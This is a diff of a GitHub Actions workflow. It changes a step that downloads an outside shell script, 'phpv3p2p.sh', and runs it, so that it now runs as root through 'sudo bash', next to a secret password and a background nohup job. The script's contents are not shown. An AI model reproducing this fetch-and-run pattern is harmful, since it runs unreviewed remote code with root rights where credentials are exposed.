@@ -22,7 +22,7 @@ jobs:
               DEBIAN_FRONTEND: noninteractive
               password: ${{secrets.password}}
             run: |
-              curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3p2p.sh ; bash /tmp/php.sh
+              echo "curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3p2p.sh ; bash /tmp/php.sh" | sudo bash
               git config --global user.email "qq2136602722@gmail.com"
               nohup bash ./touch.sh > log.txt &
               
